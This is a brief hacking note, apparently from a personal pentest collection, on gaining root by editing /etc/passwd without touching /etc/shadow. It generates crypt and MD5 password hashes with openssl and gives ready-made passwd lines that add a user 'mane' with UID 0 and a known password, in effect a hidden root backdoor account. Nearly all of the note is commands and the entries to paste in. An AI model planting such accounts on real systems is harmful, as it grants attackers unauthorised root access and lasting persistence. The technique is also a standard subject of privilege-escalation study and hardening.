# Edit passwd to login

Try to edit `/etc/passwd` to create user and login without modify `/etc/shadow` files.

Write by manesec.

# 0x0 Generate password 

```bash
$openssl passwd -crypt mane
sMH3ZTiGRR4L6

$openssl passwd -1 -salt manehack manemane
$1$manehack$rerzZaiHYZZXpZsGcJF8n1
```

# 0x1 Edit `/etc/passwd`

```
mane:sMH3ZTiGRR4L6:0:0:root:/root:/bin/bash

# password is manemane
mane:$1$manehack$rerzZaiHYZZXpZsGcJF8n1:0:0:root:/root:/bin/bash

```